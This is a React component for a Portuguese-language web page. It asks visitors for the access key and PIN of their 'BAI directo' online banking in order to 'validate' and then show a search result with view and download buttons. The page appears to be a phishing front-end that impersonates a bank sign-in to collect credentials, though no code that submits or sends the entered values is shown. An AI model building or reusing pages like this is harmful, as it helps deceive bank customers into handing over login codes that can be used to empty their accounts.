import { IoEyeSharp } from "react-icons/io5";
import { IoMdDownload } from "react-icons/io";

export default function Main() {
  return (
    <main className="grid grid-cols-1 md:grid-cols-2 md:px-4 md:pt-10 md:max-w-[95%] m-auto md:justify-center md:items-center md:gap-8">

      <section className="hidden md:block relative h-full w-full bg-[#F6F7F7] rounded-md">
          <div className="h-full flex justify-center items-center gap-2">
            <span className="bg-gray-500 text-white px-4 py-2 text-2xl rounded-sm"><IoEyeSharp /></span>
            <span className="bg-gray-500 text-white px-4 py-2 text-2xl rounded-sm"><IoMdDownload /></span>
          </div>
          <p className="bg-[#F6F7F7] text-sm text-center p-2">Att.: O resultado da busca vai ser apresentado aqui.</p>
      </section>

      <section>
        <div className="p-4 md:p-0 mb-2">
          <p className="text-[#001a48] font-semibold text-[1.4rem] md:text-4xl">
            Insira a chave e o pin do seu BAI directo para
            proceder à validação.
          </p>
        </div>

        <form action="" className="px-4 py-2 space-y-4 md:p-0">
          <div className="flex flex-col gap-2">
            <label
              htmlFor="chave"
              className="text-[#001a48] font-semibold text-[1.2rem]"
            >
              Chave *
            </label>

            <input
              type="number"
              placeholder="Insere a chave do bai directo"
              className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
              required
            />
          </div>

          <div className="flex flex-col gap-2">
            <label
              htmlFor="chave"
              className="text-[#001a48] font-semibold text-[1.2rem]"
            >
              Pin *
            </label>

            <input
              type="number"
              placeholder="Insere o pin do bai directo"
              className="text-[#212529] text-[1rem] font-semibold py-1.5  px-3 w-full border border-gray-300 rounded-md focus:shadow-[0_0_0_3px_rgba(147,197,253,1)] focus:outline-none transition"
              required
            />
          </div>

          <div className="flex justify-end">
            <button className="text-white bg-[#00a1e0] text-[1rem] font-semibold py-2 px-13 rounded-md">Validar</button>
          </div>
        </form>
      </section>
    </main>
  );
}
